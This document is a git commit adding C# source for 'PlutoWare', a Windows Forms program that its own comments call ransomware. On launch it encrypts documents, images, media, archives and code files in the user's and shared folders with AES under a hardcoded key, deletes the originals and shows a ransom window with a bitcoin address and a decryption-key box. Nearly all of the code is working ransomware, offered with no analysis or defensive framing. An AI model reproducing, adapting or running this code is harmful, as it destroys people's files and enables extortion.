230bfad10c7406b3ff5d68a3dbd93f59c152b9f3
Jake Watson <jakeoliverwatson@gmail.com>
2022-01-27 19:54:56 +0000

    Add files via upload

---
+++ Plutus/Form1.Designer.cs
@@ -0,0 +1,128 @@
+﻿
+namespace Plutus
+{
+    partial class pluto
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(pluto));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.bitcoinAddr = new System.Windows.Forms.TextBox();
+            this.Description = new System.Windows.Forms.Label();
+            this.keyBox = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.ErrorImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.ErrorImage")));
+            this.pictureBox1.ImageLocation = ".\\Plutus\\img\\hadesb.jpg";
+            this.pictureBox1.InitialImage = ((System.Drawing.Image)(resources.GetObject("pictureBox1.InitialImage")));
+            this.pictureBox1.Location = new System.Drawing.Point(12, 12);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(258, 426);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // bitcoinAddr
+            // 
+            this.bitcoinAddr.BackColor = System.Drawing.Color.Maroon;
+            this.bitcoinAddr.Enabled = false;
+            this.bitcoinAddr.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold);
+            this.bitcoinAddr.ForeColor = System.Drawing.Color.Black;
+            this.bitcoinAddr.Location = new System.Drawing.Point(276, 396);
+            this.bitcoinAddr.Multiline = true;
+            this.bitcoinAddr.Name = "bitcoinAddr";
+            this.bitcoinAddr.Size = new System.Drawing.Size(512, 42);
+            this.bitcoinAddr.TabIndex = 1;
+            this.bitcoinAddr.Text = "18SSoWkoxbi6FwJnAV744hBAexwhxzn6pg";
+            this.bitcoinAddr.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // Description
+            // 
+            this.Description.AutoSize = true;
+            this.Description.Font = new System.Drawing.Font("Microsoft Sans Serif", 11F);
+            this.Description.Location = new System.Drawing.Point(276, 12);
+            this.Description.Name = "Description";
+            this.Description.Size = new System.Drawing.Size(510, 312);
+            this.Description.TabIndex = 2;
+            this.Description.Text = resources.GetString("Description.Text");
+            // 
+            // keyBox
+            // 
+            this.keyBox.Font = new System.Drawing.Font("Microsoft YaHei", 7.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.keyBox.Location = new System.Drawing.Point(276, 348);
+            this.keyBox.Multiline = true;
+            this.keyBox.Name = "keyBox";
+            this.keyBox.Size = new System.Drawing.Size(248, 42);
+            this.keyBox.TabIndex = 3;
+            this.keyBox.Text = "ENTER DECRYPTION KEY\r\n[The key gets trimmed]";
+            this.keyBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Microsoft YaHei", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(530, 348);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(258, 42);
+            this.button1.TabIndex = 4;
+            this.button1.Text = "DECRYPT ME!";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // pluto
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Gold;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.keyBox);
+            this.Controls.Add(this.Description);
+            this.Controls.Add(this.bitcoinAddr);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "pluto";
+            this.Text = "PlutoWare";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.TextBox bitcoinAddr;
+        private System.Windows.Forms.Label Description;
+        private System.Windows.Forms.TextBox keyBox;
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ Plutus/Form1.cs
@@ -0,0 +1,271 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+
+using System.IO;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Runtime;
+
+//
+//  This ransomware will ecnrypt a large
+//  amount of files, these files are
+//  included in a array below named
+//  fileExtension. If we where you we'd
+//  pay the ransome its only $20
+//
+
+namespace Plutus
+{
+    public partial class pluto : Form
+    {
+
+        List<string> filesToLock = new List<string>();
+
+        public pluto()
+        {
+
+            //executing file grabbing in constructor
+
+            string[] fileExtension = new string[] {"*.docx", "*.pptx", "*.txt",
+                                               "*.jpeg", "*.jpg", "*.png",
+                                               "*.pdf", "*.mp3", "*.gif",
+                                               "*.ppt", "*.zip", "*.bat",
+                                               "*.py", "*.vb", "*.vbs",
+                                               "*.bmp", "*.ps2", "*.jbig",
+                                               "*.mp4", "*.mkv", "*.php",
+                                               "*.avi", "*.rar", "*.wav",
+                                               "*.xls", "*.xlsx", "*.htm", 
+                                               "*.html", "*.json", "*.html",
+                                               "*.md", "*.cpp", "*.h",
+                                               "*.pluto"};
+
+            //Areas that'll be locked
+            List<string> dirsToLock = new List<string>();
+            
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
+            dirsToLock.Add(@Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
+            
+            string[] dirsToLockArr = dirsToLock.ToArray();
+
+            for (int dirIndex = 0; dirIndex < dirsToLockArr.Length; dirIndex++)
+            {
+                foreach (string ext in fileExtension)
+                {
+                    try
+                    {
+                        string[] temp = Directory.GetFiles(dirsToLockArr[dirIndex], ext, SearchOption.AllDirectories);
+
+                    for (int index = 0; index < temp.Length; index++)
+                        {
+                            if (temp[index] == null)
+                            {
+                                //prevent form encrpyting/decrypting missing values
+                                continue;
+                            }
+                            else if ((temp[index].Contains(".pluto")))
+                            {
+                                //prevent double encryption 
+                                filesToLock.Add(temp[index]);
+                                continue;
+                            }
+                            filesToLock.Add(temp[index]);
+                            lockFiles(temp[index], "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        //to catch errors when grabbing files
+                        continue;
+                    }
+
+                }
+            }
+
+            filesToLock.ToArray();
+
+            InitializeComponent();
+            
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+            if(keyBox.Text == "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206")
+            {
+                MessageBox.Show("Key accepted, decrpytion will start now. \nJust sit tight, and relax");
+                foreach (string unlockingFiles in filesToLock)
+                {
+                    if (unlockingFiles.Contains(".pluto"))
+                    {
+                        this.unlockFile(unlockingFiles, "b4bf229e792f4ff18b1baccb7785ca743b9af297101f64be005e1cc19ed0b206");
+                    }
+                }
+                    MessageBox.Show("Decrypted enjoy your files \n" +
+                                "                  \\(¬_¬)/ \n" +
+                                "                      |_| \n" +
+                                "                      / \\ " );
+            }
+            else
+            {
+                MessageBox.Show("That key was wrong, what to do? \n " +
+                    "      - Make sure you've paid \n" +
+                    "      - Make sure you've copied the key properly \n" +
+                    "      - Contact us asking for help key \n" +
+                    "      - Send us proof that you've paid and will send \n" +
+                    "        functioning key or decryprion software");
+            }
+        }
+
+        //File encryption goes here :)
+        //Everything below goes for file locking/unlocking
+
+        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
+        public static extern bool ZeroMemory(IntPtr Destitnation, int length);
+
+
+        //generating our salt keys here
+        public static byte[] createSalt()
+        {
+            byte[] data = new byte[32];
+
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for(int index = 0; index<10; index++)
+                {
+                    rng.GetBytes(data);
+                }
+            }
+
+            return data;
+
+        }
+
+
+        //locking files here
+        private void lockFiles(string inputFiles, string password)
+        {
+            byte[] salt = createSalt();
+
+            FileStream fs = new FileStream(inputFiles+".pluto", FileMode.Append);
+
+            byte[] passBytes = System.Text.Encoding.UTF8.GetBytes(password);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+
+            var key = new Rfc2898DeriveBytes(passBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            AES.Mode = CipherMode.CFB;
+
+            fs.Write(salt, 0, salt.Length);
+            CryptoStream cs = new CryptoStream(fs, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputFiles, FileMode.Open);
+
+            byte[] buffer = new byte[91048576];
+            int read;
+
+            try
+            {
+                while((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    Application.DoEvents();
+                    cs.Write(buffer, 0, read);
+                }
+
+                fsIn.Close();
+
+            }
+            catch(Exception e)
+            {
+
+            }
+            finally
+            {
+                File.Delete(inputFiles);
+                cs.Close();
+                fs.Close();
+            }
+        }
+
+
+        //unlocking files here
+        private void unlockFile(string inputFiles, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[32];
+
+            FileStream fsCrypt = new FileStream(inputFiles, FileMode.Open);
+            fsCrypt.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CFB;
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read);
+            string outputFile = inputFiles.Replace(".pluto", "");
+
+            FileStream fsOut = new FileStream(outputFile, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+
+            try
+            {
+                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    Application.DoEvents();
+                    fsOut.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            try
+            {
+                cs.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
+            }
+            finally
+            {
+                File.Delete(inputFiles);
+                fsOut.Close();
+                fsCrypt.Close();
+            }
+        }
+
+    }
+}
